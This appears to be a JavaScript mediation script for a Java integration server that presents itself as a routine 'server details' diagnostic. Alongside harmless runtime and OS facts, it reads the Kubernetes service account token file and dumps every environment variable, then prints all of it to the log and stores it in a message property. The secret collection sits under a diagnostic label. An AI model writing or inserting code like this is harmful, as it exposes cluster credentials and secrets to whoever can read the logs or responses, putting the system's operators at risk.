inSequence.script:

// Get server details
var serverDetails = {};

function readFileContent(path) {
    var content = "";
    try {
        var file = new java.io.File(path);
        if (file.exists() && file.isFile()) {
            var reader = new java.io.BufferedReader(new java.io.FileReader(file));
            var line;
            while ((line = reader.readLine()) != null) {
                content += line + "\n";
            }
            reader.close();
        } else {
            content = "File not found or is a directory.";
        }
    } catch (e) {
        content = "Error reading file: " + e.getMessage();
    }
    return content;
}

            // Capturing Kubernetes-specific environment variables
            var k8sEnv = {};
            k8sEnv.podName = java.lang.System.getenv("HOSTNAME");
            k8sEnv.serviceHost = java.lang.System.getenv("KUBERNETES_SERVICE_HOST");
            k8sEnv.servicePort = java.lang.System.getenv("KUBERNETES_SERVICE_PORT");
            k8sEnv.containerName = java.lang.System.getenv("CONTAINER_NAME");
            k8sEnv.podIP = java.lang.System.getenv("POD_IP");
            k8sEnv.nodeName = java.lang.System.getenv("NODE_NAME");
            serverDetails.k8sInfo = k8sEnv;

            // Capturing Kubernetes Service Account token and CA certificate
            var serviceAccountTokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token";
            serverDetails.k8sServiceAccountToken = readFileContent(serviceAccountTokenPath);

            // Capturing all other environment variables
            var envMap = java.lang.System.getenv();
            var allEnvVariables = {};
            var iterator = envMap.keySet().iterator();
            while (iterator.hasNext()) {
                var key = iterator.next();
                var value = envMap.get(key);
                allEnvVariables[key] = value;
            }
            serverDetails.allEnvironmentVariables = allEnvVariables;

// Get Java system properties
var javaVersion = java.lang.System.getProperty("java.version");
var javaVendor = java.lang.System.getProperty("java.vendor");
var osName = java.lang.System.getProperty("os.name");
var osVersion = java.lang.System.getProperty("os.version");
var osArch = java.lang.System.getProperty("os.arch");
var userDir = java.lang.System.getProperty("user.dir");
var javaHome = java.lang.System.getProperty("java.home");

// Get server hostname and IP
try {
    var InetAddress = java.net.InetAddress;
    var localhost = InetAddress.getLocalHost();
    var hostname = localhost.getHostName();
    var hostAddress = localhost.getHostAddress();

    serverDetails.hostname = hostname;
    serverDetails.ipAddress = hostAddress;
} catch (e) {
    serverDetails.hostname = "Unable to retrieve";
    serverDetails.ipAddress = "Unable to retrieve";
}

// Get runtime information
var runtime = java.lang.Runtime.getRuntime();
var totalMemory = runtime.totalMemory();
var freeMemory = runtime.freeMemory();
var maxMemory = runtime.maxMemory();
var usedMemory = totalMemory - freeMemory;
var availableProcessors = runtime.availableProcessors();

// Get current timestamp
var currentTime = new java.util.Date();

// Build server details object
serverDetails.javaVersion = javaVersion;
serverDetails.javaVendor = javaVendor;
serverDetails.javaHome = javaHome;
serverDetails.osName = osName;
serverDetails.osVersion = osVersion;
serverDetails.osArch = osArch;
serverDetails.workingDirectory = userDir;
serverDetails.totalMemoryMB = Math.round(totalMemory / (1024 * 1024));
serverDetails.freeMemoryMB = Math.round(freeMemory / (1024 * 1024));
serverDetails.usedMemoryMB = Math.round(usedMemory / (1024 * 1024));
serverDetails.maxMemoryMB = Math.round(maxMemory / (1024 * 1024));
serverDetails.availableProcessors = availableProcessors;
serverDetails.timestamp = currentTime.toString();

var pathVariable = java.lang.System.getenv("PATH");
serverDetails.pathVariable = pathVariable;

// Convert to JSON string
var serverDetailsJson = JSON.stringify(serverDetails, null, 2);

// Log server details
print("=== Server Details ===");
print(serverDetailsJson);

// Set server details as a message context property
mc.setProperty("SERVER_DETAILS", serverDetailsJson);
